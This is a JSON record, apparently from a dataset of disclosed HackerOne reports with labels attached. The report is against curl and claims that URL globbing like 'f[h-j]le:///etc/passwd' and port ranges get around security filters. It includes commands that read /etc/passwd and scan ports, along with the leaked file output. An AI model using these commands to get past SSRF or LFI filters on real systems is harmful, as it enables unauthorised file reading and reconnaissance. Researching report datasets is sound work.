@@ -1,0 +1,48 @@
+{
+    "reported_to": "curl",
+    "reported_by": "iylz ",
+    "title": "error parse uri path in curl",
+    "content": "\nSummary:\n[add summary of the vulnerability]\nThe uri path error could lead to security filter bypasses.\nFor example,\nwe can use curl -vv 'f[h-j]le:///etc/passwd' to bypass file protocol black list\nwe can use curl -vv 'http://1.1.1.1:[80-9000]' to scan the open port in the host\netc ...\nSteps To Reproduce:\n[add details for how we can reproduce the issue]\ncurl -vv 'f[h-j]le:///etc/passwd' will parse 3 request , like curl -vv 'fhle:///etc/passwd' \u3001curl -vv 'file:///etc/passwd' \u3001curl -vv 'fjle:///etc/passwd'\nCode 2.17 KiB\n1[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -Version\n2curl 7.83.1 (x86_64-pc-linux-gnu) libcurl/7.83.1 zlib/1.2.7\n3Release-Date: 2022-05-11\n4Protocols: dict file ftp gopher http imap mqtt pop3 rtsp smtp telnet tftp \n5Features: alt-svc AsynchDNS IPv6 Largefile libz UnixSockets\n6[root@iz2ze9awqx4bwtc7j5q4hsz bin]# ./curl -vv 'f[h-j]le:///etc/passwd'\n7* Protocol \"fhle\" not supported or disabled in libcurl\n8* Closing connection -1\n9curl: (1) Protocol \"fhle\" not supported or disabled in libcurl\n10root:x:0:0:root:/root:/bin/bash\n11bin:x:1:1:bin:/bin:/sbin/nologin\n12daemon:x:2:2:daemon:/sbin:/sbin/nologin\n13adm:x:3:4:adm:/var/adm:/sbin/nologin\n14lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n15sync:x:5:0:sync:/sbin:/bin/sync\n16shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n17halt:x:7:0:halt:/sbin:/sbin/halt\n18mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n19operator:x:11:0:operator:/root:/sbin/nologin\n20games:x:12:100:games:/usr/games:/sbin/nologin\n21ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\n22nobody:x:99:99:Nobody:/:/sbin/nologin\n23systemd-bus-proxy:x:999:998:systemd Bus Proxy:/:/sbin/nologin\n24systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\n25dbus:x:81:81:System message bus:/:/sbin/nologin\n26polkitd:x:998:997:User for polkitd:/:/sbin/nologin\n27tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\n28sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\n29postfix:x:89:89::/var/spool/postfix:/sbin/nologin\n30chrony:x:997:995::/var/lib/chrony:/sbin/nologin\n31ntp:x:38:38::/etc/ntp:/sbin/nologin\n32nscd:x:28:28:NSCD Daemon:/:/sbin/nologin\n33tcpdump:x:72:72::/:/sbin/nologin\n34admin:x:1000:1000::/home/admin:/sbin/nologin\n35apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\n36postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/sbin/nologin\n37squid:x:23:23::/var/spool/squid:/sbin/nologin\n38workftp:x:1002:1003::/home/work/ftp/:/sbin/nologin\n39mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin\n40* Closing connection 0\n41* Protocol \"fjle\" not supported or disabled in libcurl\n42* Closing connection -1\n43curl: (1) Protocol \"fjle\" not supported or disabled in libcurl\n44[root@iz2ze9awqx4bwtc7j5q4hsz bin]# wget 'f[h-j]le:///etc/passwd'\n45f[h-j]le:///etc/passwd: \u5730\u5740\u7f3a\u5c11\u534f\u8bae\u7c7b\u578b.\n46[root@iz2ze9awqx4bwtc7j5q4hsz bin]# \nSo, I think this is a security questions of curl, because the wget doesn't have same question. Thinks\nSupporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n[attachment / reference]\nImpact\nbypass the security filter like the SSRF/RFL/LFI etc.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Improper Access Control - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1652488440,
+    "report_url": "https://hackerone.com/reports/1566462",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Run the command: curl -vv 'f[h-j]le:///etc/passwd'"
+        ],
+        [
+            2,
+            "Observe that the command attempts to parse multiple URI paths, including 'file:///etc/passwd', bypassing file protocol blacklists"
+        ]
+    ],
+    "vuln_description": "The vulnerability involves a URI path parsing error in curl that allows bypassing security filters. Specifically, using character ranges in the protocol (e.g., 'f[h-j]le') or port numbers (e.g., '[80-9000]') can lead to security filter bypasses, enabling SSRF, RFL, or LFI attacks.",
+    "reason": "The attack is straightforward and involves a single component (curl's URI parsing). The interaction is obvious once the tester understands how curl handles character ranges in URIs. No complex application states or novel logic are involved.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": false,
+        "authnz_byppass_detectable": false
+    }
+}
